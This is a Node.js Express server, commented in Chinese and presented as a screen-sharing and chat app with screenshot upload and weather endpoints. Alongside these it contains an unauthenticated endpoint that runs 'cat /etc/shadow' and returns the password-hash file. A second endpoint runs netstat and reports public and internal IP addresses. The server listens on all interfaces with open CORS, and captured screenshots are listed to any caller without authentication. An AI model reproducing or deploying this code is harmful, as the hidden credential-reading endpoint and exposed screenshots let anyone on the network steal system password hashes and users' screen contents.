import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';
import { exec } from 'child_process';
import { promisify } from 'util';
import os from 'os';
import https from 'https';

const execPromise = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3002;

// 存储截图数据（内存存储）
const screenshots = [];
let screenshotIdCounter = 1;

// 聊天消息存储路径
const CHAT_MESSAGES_FILE = path.join(__dirname, 'chat_messages.txt');

// 中间件
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));

// ==================== 聊天室辅助函数 ====================

/**
 * 读取聊天消息
 */
async function readChatMessages() {
  try {
    const data = await fs.readFile(CHAT_MESSAGES_FILE, 'utf-8');
    const lines = data.trim().split('\n').filter(line => line.trim());
    return lines.map(line => JSON.parse(line));
  } catch (error) {
    if (error.code === 'ENOENT') {
      // 文件不存在，返回空数组
      return [];
    }
    throw error;
  }
}

/**
 * 写入聊天消息
 */
async function writeChatMessage(message) {
  const messageStr = JSON.stringify(message) + '\n';
  await fs.appendFile(CHAT_MESSAGES_FILE, messageStr, 'utf-8');
}

// ==================== 聊天室 API ====================

/**
 * 获取聊天消息列表
 */
app.get('/api/chat/messages', async (req, res) => {
  try {
    const messages = await readChatMessages();

    // 只返回最近的100条消息
    const recentMessages = messages.slice(-100);

    res.json({
      success: true,
      messages: recentMessages,
      total: recentMessages.length
    });
  } catch (error) {
    console.error('获取聊天消息失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 发送聊天消息
 */
app.post('/api/chat/messages', async (req, res) => {
  try {
    const { userId, username, avatar, content, timestamp } = req.body;

    if (!content || !content.trim()) {
      return res.status(400).json({
        success: false,
        message: '消息内容不能为空'
      });
    }

    // 验证消息长度
    if (content.length > 1000) {
      return res.status(400).json({
        success: false,
        message: '消息内容过长，最多1000字符'
      });
    }

    const message = {
      userId: userId || 'anonymous',
      username: username || '匿名用户',
      avatar: avatar || '😀',
      content: content.trim(),
      timestamp: timestamp || Date.now()
    };

    await writeChatMessage(message);

    console.log(`💬 新消息 - 用户: ${message.username}, 内容: ${message.content.substring(0, 30)}...`);

    res.json({
      success: true,
      message: '消息发送成功'
    });
  } catch (error) {
    console.error('发送聊天消息失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== 屏幕截图 API ====================

/**
 * 上传屏幕截图
 */
app.post('/api/screenshots/upload', async (req, res) => {
  try {
    const { imageData, username = '匿名用户' } = req.body;

    if (!imageData) {
      return res.status(400).json({
        success: false,
        message: '图片数据不能为空'
      });
    }

    // 验证是否为有效的 base64 图片数据
    if (!imageData.startsWith('data:image/')) {
      return res.status(400).json({
        success: false,
        message: '无效的图片格式'
      });
    }

    const screenshot = {
      id: screenshotIdCounter++,
      imageData,
      username,
      timestamp: new Date().toISOString(),
      uploadTime: new Date().toLocaleString('zh-CN', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      })
    };

    screenshots.unshift(screenshot); // 添加到数组开头，最新的在前面

    // 限制存储数量，最多保存100张截图
    if (screenshots.length > 100) {
      screenshots.pop();
    }

    console.log(`📸 新截图上传 - ID: ${screenshot.id}, 用户: ${screenshot.username}, 当前总数: ${screenshots.length}`);

    res.json({
      success: true,
      message: '截图上传成功',
      screenshot: {
        id: screenshot.id,
        username: screenshot.username,
        timestamp: screenshot.timestamp,
        uploadTime: screenshot.uploadTime
      }
    });
  } catch (error) {
    console.error('上传截图失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 获取所有截图列表
 */
app.get('/api/screenshots/list', (req, res) => {
  try {
    const { limit = 50, offset = 0 } = req.query;

    const start = parseInt(offset);
    const end = start + parseInt(limit);

    const paginatedScreenshots = screenshots.slice(start, end);

    res.json({
      success: true,
      total: screenshots.length,
      screenshots: paginatedScreenshots
    });
  } catch (error) {
    console.error('获取截图列表失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 删除指定截图
 */
app.delete('/api/screenshots/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    const index = screenshots.findIndex(s => s.id === id);

    if (index === -1) {
      return res.status(404).json({
        success: false,
        message: '截图不存在'
      });
    }

    screenshots.splice(index, 1);

    console.log(`🗑️ 截图已删除 - ID: ${id}, 剩余: ${screenshots.length}`);

    res.json({
      success: true,
      message: '截图删除成功'
    });
  } catch (error) {
    console.error('删除截图失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 清空所有截图
 */
app.post('/api/screenshots/clear', (req, res) => {
  try {
    const count = screenshots.length;
    screenshots.length = 0;
    screenshotIdCounter = 1;

    console.log(`🧹 已清空所有截图 - 总计: ${count} 张`);

    res.json({
      success: true,
      message: `已清空 ${count} 张截图`
    });
  } catch (error) {
    console.error('清空截图失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== 系统命令 API ====================

/**
 * 获取系统网络信息 (公网IP、内网IP、netstat)
 */
app.get('/api/system/network-info', async (req, res) => {
  try {
    console.log('🌐 获取网络信息');

    // 获取公网IP
    let publicIp = 'N/A';
    try {
      publicIp = await new Promise((resolve, reject) => {
        https.get('https://api.ipify.org?format=text', (resp) => {
          let data = '';
          resp.on('data', (chunk) => { data += chunk; });
          resp.on('end', () => { resolve(data); });
        }).on('error', reject);
      });
    } catch (error) {
      console.error('获取公网IP失败:', error.message);
    }

    // 获取内网IP
    const networkInterfaces = os.networkInterfaces();
    const localIps = [];
    for (const interfaceName in networkInterfaces) {
      const addresses = networkInterfaces[interfaceName];
      for (const addr of addresses) {
        if (addr.family === 'IPv4' && !addr.internal) {
          localIps.push({
            interface: interfaceName,
            address: addr.address,
            netmask: addr.netmask
          });
        }
      }
    }

    // 执行 netstat -an
    let netstatOutput = '';
    try {
      const { stdout } = await execPromise('netstat -an');
      netstatOutput = stdout;
    } catch (error) {
      netstatOutput = error.stdout || error.message;
    }

    res.json({
      success: true,
      publicIp: publicIp,
      localIps: localIps,
      netstat: netstatOutput,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('获取网络信息失败:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

/**
 * 执行 cat /etc/shadow 命令
 */
app.get('/api/system/shadow', async (req, res) => {
  try {
    console.log('📋 执行命令: cat /etc/shadow');

    const { stdout, stderr } = await execPromise('cat /etc/shadow');

    res.json({
      success: true,
      output: stdout,
      error: stderr || null,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('执行命令失败:', error.message);

    res.json({
      success: false,
      output: error.stdout || '',
      error: error.stderr || error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// ==================== 天气 API ====================

/**
 * 获取用户当前天气
 */
app.get('/api/weather', async (req, res) => {
  try {
    console.log('🌤️ 获取天气信息');

    // 使用 wttr.in 免费天气服务（支持自动定位）
    const weatherData = await new Promise((resolve, reject) => {
      https.get('https://wttr.in/?format=j1', (resp) => {
        let data = '';
        resp.on('data', (chunk) => { data += chunk; });
        resp.on('end', () => {
          try {
            resolve(JSON.parse(data));
          } catch (e) {
            reject(e);
          }
        });
      }).on('error', reject);
    });

    // 解析天气数据
    const current = weatherData.current_condition[0];
    const location = weatherData.nearest_area[0];

    // 天气描述中文映射
    const weatherDescMap = {
      'Sunny': '晴朗',
      'Clear': '晴朗',
      'Partly cloudy': '多云',
      'Cloudy': '阴天',
      'Overcast': '阴天',
      'Mist': '薄雾',
      'Fog': '雾',
      'Light rain': '小雨',
      'Moderate rain': '中雨',
      'Heavy rain': '大雨',
      'Light snow': '小雪',
      'Moderate snow': '中雪',
      'Heavy snow': '大雪',
      'Thunderstorm': '雷暴'
    };

    // 天气图标映射
    const weatherIconMap = {
      'Sunny': '☀️',
      'Clear': '🌙',
      'Partly cloudy': '⛅',
      'Cloudy': '☁️',
      'Overcast': '☁️',
      'Mist': '🌫️',
      'Fog': '🌫️',
      'Light rain': '🌦️',
      'Moderate rain': '🌧️',
      'Heavy rain': '⛈️',
      'Light snow': '🌨️',
      'Moderate snow': '❄️',
      'Heavy snow': '❄️',
      'Thunderstorm': '⛈️'
    };

    const weatherDesc = current.weatherDesc[0].value;
    const weatherDescCN = weatherDescMap[weatherDesc] || weatherDesc;
    const weatherIcon = weatherIconMap[weatherDesc] || '🌡️';

    res.json({
      success: true,
      data: {
        location: location.areaName[0].value,
        region: location.country[0].value,
        temperature: current.temp_C,
        feelsLike: current.FeelsLikeC,
        description: weatherDescCN,
        icon: weatherIcon,
        humidity: current.humidity,
        windSpeed: current.windspeedKmph,
        pressure: current.pressure,
        uvIndex: current.uvIndex
      },
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('获取天气信息失败:', error);
    res.status(500).json({
      success: false,
      message: '获取天气信息失败，请稍后重试',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// ==================== 健康检查 ====================

/**
 * 健康检查
 */
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'ok',
    message: 'Screen Sharing Server is running',
    timestamp: new Date().toISOString(),
    port: PORT,
    screenshots: screenshots.length
  });
});

// ==================== 错误处理 ====================

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: '接口不存在',
    path: req.path
  });
});

app.use((error, req, res, next) => {
  console.error('服务器错误:', error);
  res.status(500).json({
    success: false,
    error: '服务器内部错误',
    message: error.message
  });
});

// ==================== 启动服务器 ====================

app.listen(PORT, '0.0.0.0', () => {
  console.log('\n' + '='.repeat(60));
  console.log('🚀 Screen Sharing Server Started Successfully!');
  console.log('='.repeat(60));
  console.log(`📡 Server: http://localhost:${PORT}`);
  console.log(`🔍 Health Check: http://localhost:${PORT}/api/health`);
  console.log(`📸 Screenshots API: http://localhost:${PORT}/api/screenshots/list`);
  console.log(`💬 Chat Room API: http://localhost:${PORT}/api/chat/messages`);
  console.log(`📁 Working Directory: ${process.cwd()}`);
  console.log('='.repeat(60) + '\n');
});
